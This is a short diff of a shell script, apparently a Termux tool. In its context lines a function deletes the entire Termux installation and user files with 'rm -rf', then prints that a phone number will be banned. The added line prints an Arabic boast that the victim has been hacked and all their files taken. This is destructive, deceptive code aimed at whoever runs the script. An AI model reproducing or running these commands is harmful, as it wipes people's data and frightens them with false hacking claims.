@@ -207,6 +207,7 @@ rm -rf /data/data/com.termux/files/usr
 rm -rf /data/data/com.termux/files
 sleep 20 && clear
 echo "number will banned after few minutes"
+echo "تم اختراقك و سحب كل ملفاتك من قبل ميزو حاكم الدمار☠"
 sleep 10
 }
 
